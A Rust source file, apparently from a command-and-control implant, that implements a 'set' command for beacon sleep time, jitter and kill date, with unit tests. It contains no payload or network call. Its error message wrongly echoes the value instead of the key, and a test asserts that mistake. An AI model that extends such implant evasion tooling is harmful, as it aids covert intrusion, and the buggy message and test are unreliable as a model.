use crate::commands::{CommandMeta, CommandResult, ImplantCommand};

pub struct SetCommand;

impl SetCommand {
    const META: CommandMeta = CommandMeta {
        name: "set",
        description: "Set a config",
        usage: "set <config> <value> (options: sleep, jitter, kill_date)",
    };
}

impl ImplantCommand for SetCommand {
    fn meta(&self) -> &CommandMeta {
        &Self::META
    }

    fn execute(&self, args: &[String], ctx: &mut super::ImplantContext) -> CommandResult {
        if args.len() != 2 {
            return CommandResult {
                success: false,
                output: "set <config> <value>".to_string(),
            };
        }

        match args[0].as_str() {
            "sleep" => {
                let Ok(val) = args[1].parse::<u64>() else {
                    return CommandResult {
                        success: false,
                        output: "invalid value".to_string(),
                    };
                };
                ctx.sleep_time_secs = val;
            }
            "jitter" => {
                let Ok(val) = args[1].parse::<u32>() else {
                    return CommandResult {
                        success: false,
                        output: "invalid value".to_string(),
                    };
                };
                ctx.jitter = val;
            }
            "kill_date" => {
                let Ok(val) = args[1].parse::<chrono::DateTime<chrono::Utc>>() else {
                    return CommandResult {
                        success: false,
                        output: "invalid datetime".to_string(),
                    };
                };
                ctx.kill_date = val;
            }
            _ => {
                return CommandResult {
                    success: false,
                    output: format!("invalid config key {}", args[1]),
                };
            }
        }

        CommandResult {
            success: true,
            output: format!("set {} to {}", args[0], args[1]),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::commands::test_context;

    #[test]
    fn test_set_value() {
        let cmd = SetCommand;
        let mut ctx = test_context();

        let args = &["sleep".to_string(), "10".to_string()];

        let result = cmd.execute(args, &mut ctx);
        assert_eq!(result.success, true);
        assert_eq!(result.output, format!("set {} to {}", args[0], args[1]))
    }

    #[test]
    fn test_set_invalid_key() {
        let cmd = SetCommand;
        let mut ctx = test_context();

        let args = &["slep".to_string(), "10".to_string()];

        let result = cmd.execute(args, &mut ctx);
        assert_eq!(result.success, false);
        assert_eq!(result.output, format!("invalid config key {}", args[1]))
    }

    #[test]
    fn test_set_invalid_value() {
        let cmd = SetCommand;
        let mut ctx = test_context();

        let args = &["sleep".to_string(), "asd".to_string()];

        let result = cmd.execute(args, &mut ctx);
        assert_eq!(result.success, false);
        assert_eq!(result.output, "invalid value".to_string());
    }
}
